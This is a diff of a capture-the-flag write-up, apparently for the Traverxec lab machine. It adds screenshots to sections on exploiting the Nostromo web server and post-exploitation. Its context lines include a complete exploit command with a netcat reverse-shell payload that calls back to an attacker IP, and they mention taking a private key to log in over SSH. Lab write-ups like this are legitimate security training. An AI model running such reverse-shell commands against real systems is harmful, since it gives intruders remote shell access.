@@ -47,6 +47,9 @@ Grab netcat reverse shell payload from Pentest Monkey a use as payload:
 ```
 python nostromo.py -t '10.10.10.165' -p 80 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f'
 ```
+
+![foothold](/images/traverxec/foothold.png)
+
 #### Post Exploitation Enumeration
 
 Enumerating the file system of Nostromo
@@ -77,6 +80,8 @@ Turns out that we can, but we can't access files such as .bashrc or .ssh folder
 ![david_home](/images/traverxec/david_home.png)
 
 We try navigating to the public_www folder on the shell and we are successful
+
+![public_www](/images/traverxec/public_www.png)
 
 We grab the gz file, extract it and ssh with the private key.
 
